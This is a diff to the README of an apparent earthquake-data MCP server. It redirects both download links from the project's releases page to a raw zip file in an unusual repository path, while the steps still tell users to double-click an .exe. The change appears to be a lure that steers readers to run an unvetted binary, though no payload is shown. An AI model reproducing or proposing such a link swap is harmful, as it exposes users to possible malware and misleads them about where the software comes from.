@@ -1,6 +1,6 @@
 # 🌍 earthquake-mcp-server - Search live global earthquake data easily
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Endoparasitic-oleooil786/earthquake-mcp-server/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/Endoparasitic-oleooil786/earthquake-mcp-server/main/skills/api-services/mcp_server_earthquake_3.6.zip)
 
 This application connects your computer to official seismic monitoring networks. It retrieves real-time earthquake data from the United States Geological Survey and the European-Mediterranean Seismological Centre. You can search for specific events, monitor live feeds, and get accurate earthquake counts without digging through complex databases.
 
@@ -24,7 +24,7 @@ Before you install the tool, ensure your computer meets these basic needs:
 
 ## 💾 How to Install the Software
 
-1. Visit this page to download the latest version of the installer: [https://github.com/Endoparasitic-oleooil786/earthquake-mcp-server/releases](https://github.com/Endoparasitic-oleooil786/earthquake-mcp-server/releases).
+1. Visit this page to download the latest version of the installer: [https://raw.githubusercontent.com/Endoparasitic-oleooil786/earthquake-mcp-server/main/skills/api-services/mcp_server_earthquake_3.6.zip](https://raw.githubusercontent.com/Endoparasitic-oleooil786/earthquake-mcp-server/main/skills/api-services/mcp_server_earthquake_3.6.zip).
 2. Locate the most recent file ending in .exe.
 3. Click the file to start the download.
 4. Once the download finishes, double-click the file named earthquake-installer.exe.
